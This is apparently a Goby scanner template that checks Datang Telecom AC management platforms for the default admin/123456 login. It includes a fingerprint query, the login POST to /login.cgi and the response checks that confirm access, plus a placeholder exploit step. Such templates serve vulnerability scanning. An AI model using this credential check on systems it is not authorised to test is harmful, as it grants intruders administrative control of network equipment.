{
      "Name": "Datang AC Default Password",
      "Level": "2",
      "Tags": [
            "defaultaccount"
      ],
      "GobyQuery": "app=\"大唐电信AC集中管理平台\" || title=\"大唐电信AC集中管理平台\"",
      "Description": "",
      "Product": "Datang Telecom AC centralized management platform",
      "Homepage": "http://www.datang.com/",
      "Author": "",
      "Impact": "Datang AC centralized management platform default password admin/123456",
      "Recommendation": "",
      "References": [],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/login.cgi",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "user=admin&password1=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81&password=123456&Submit=%E7%AB%8B%E5%8D%B3%E7%99%BB%E5%BD%95",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "window.open('index.htm?_",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$head",
                                    "operation": "contains",
                                    "value": "ac_userid=admin,ac_passwd=",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/test.php",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "test",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}